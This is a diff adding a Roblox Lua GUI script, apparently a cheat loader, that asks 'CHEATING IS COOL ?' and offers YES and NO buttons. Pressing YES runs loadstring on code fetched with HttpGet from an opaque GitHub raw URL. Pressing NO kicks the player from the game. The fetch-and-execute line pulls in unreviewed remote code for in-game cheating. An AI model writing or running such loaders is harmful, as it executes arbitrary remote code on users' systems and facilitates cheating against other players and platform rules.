@@ -1,0 +1,117 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Mortal_Beautiful = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Welcome = Instance.new("TextLabel")
+local Hello = Instance.new("TextLabel")
+local A = Instance.new("TextButton")
+local b = Instance.new("TextButton")
+local author = Instance.new("TextLabel")
+
+--Properties:
+
+Mortal_Beautiful.Name = "Mortal_Beautiful"
+Mortal_Beautiful.Parent = game.CoreGui
+Mortal_Beautiful.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = Mortal_Beautiful
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Position = UDim2.new(0.186207071, 0, 0.193190113, 0)
+Frame.Size = UDim2.new(0, 31, 0, 349)
+
+Welcome.Name = "Welcome"
+Welcome.Parent = Frame
+Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Welcome.BackgroundTransparency = 1.000
+Welcome.Position = UDim2.new(0.295315683, 0, 0, 0)
+Welcome.Size = UDim2.new(0, 200, 0, 50)
+Welcome.Font = Enum.Font.SourceSans
+Welcome.Text = "Beautiful X"
+Welcome.TextColor3 = Color3.fromRGB(255, 0, 0)
+Welcome.TextScaled = true
+Welcome.TextSize = 14.000
+Welcome.TextWrapped = true
+
+Hello.Name = "Hello"
+Hello.Parent = Frame
+Hello.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Hello.BackgroundTransparency = 1.000
+Hello.Position = UDim2.new(0.295315683, 0, 0.303724945, 0)
+Hello.Size = UDim2.new(0, 200, 0, 50)
+Hello.Font = Enum.Font.SourceSans
+Hello.Text = "CHEATING IS COOL ?"
+Hello.TextColor3 = Color3.fromRGB(255, 255, 255)
+Hello.TextScaled = true
+Hello.TextSize = 14.000
+Hello.TextWrapped = true
+
+A.Name = "A"
+A.Parent = Frame
+A.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
+A.Position = UDim2.new(0.537678182, 0, 0.504298031, 0)
+A.Size = UDim2.new(0, 200, 0, 50)
+A.ZIndex = 5
+A.Font = Enum.Font.SourceSans
+A.Text = "YES"
+A.TextColor3 = Color3.fromRGB(0, 255, 0)
+A.TextScaled = true
+A.TextSize = 14.000
+A.TextWrapped = true
+
+b.Name = "b"
+b.Parent = Frame
+b.BackgroundColor3 = Color3.fromRGB(104, 104, 104)
+b.Position = UDim2.new(0.0366598368, 0, 0.504298031, 0)
+b.Size = UDim2.new(0, 200, 0, 50)
+b.ZIndex = 5
+b.Font = Enum.Font.SourceSans
+b.Text = "NO"
+b.TextColor3 = Color3.fromRGB(255, 0, 0)
+b.TextScaled = true
+b.TextSize = 14.000
+b.TextWrapped = true
+
+author.Name = "author"
+author.Parent = Frame
+author.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+author.BackgroundTransparency = 1.000
+author.Position = UDim2.new(0.295315683, 0, 0.856733561, 0)
+author.Size = UDim2.new(0, 200, 0, 50)
+author.Font = Enum.Font.SourceSans
+author.Text = "Powered by Beautiful"
+author.TextColor3 = Color3.fromRGB(85, 170, 255)
+author.TextScaled = true
+author.TextSize = 14.000
+author.TextWrapped = true
+
+-- Scripts:
+
+local function ITCAH_fake_script() -- Frame.animation 
+	local script = Instance.new('LocalScript', Frame)
+
+	object = script.Parent
+	
+	wait(2)
+	object:TweenSize(UDim2.new(0, 491,0, 349))
+end
+coroutine.wrap(ITCAH_fake_script)()
+local function NPQNGRO_fake_script() -- A.LocalScript 
+	local script = Instance.new('LocalScript', A)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamondGamingG/-/main/%2C"))()
+		script.Parent.Parent.Parent:Destroy()
+	end)
+end
+coroutine.wrap(NPQNGRO_fake_script)()
+local function HJEOLIW_fake_script() -- b.LocalScript 
+	local script = Instance.new('LocalScript', b)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		game.Players.LocalPlayer:Kick("wrong answer !!")
+	end)
+end
+coroutine.wrap(HJEOLIW_fake_script)()
